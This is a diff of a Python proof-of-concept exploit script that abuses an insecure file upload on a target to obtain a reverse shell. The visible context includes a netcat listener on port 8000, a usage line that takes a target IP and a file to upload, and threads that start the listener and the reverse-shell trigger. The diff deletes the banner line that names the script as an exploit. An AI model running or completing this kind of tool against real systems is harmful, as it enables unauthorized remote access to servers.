@@ -1,7 +1,6 @@
 #!/usr/bin/python3
 
 import requests, sys, os, threading
-# from requests_toolbelt.multipart.encoder import MultipartEncoder
 
 def start_nc_shell():
     os.system("nc -lp 8000")
@@ -13,8 +12,6 @@ def main():
     if (len(sys.argv) < 3):
         print ("usage: ./poc.py [target ip/url] [file_to_upload]")
         sys.exit(0)
-
-    print ("Proof of concept - Insecure file upload exploit to obtain a reverse shell")
 
     ip = sys.argv[1]
     script_loc = sys.argv[2]
@@ -64,7 +61,6 @@ def main():
     t = threading.Thread(target=start_nc_shell)
     t.start()
 
-    # get user id?
     s = threading.Thread(target=start_rev, args=(sess,ip,proxy))
     t.join();
 
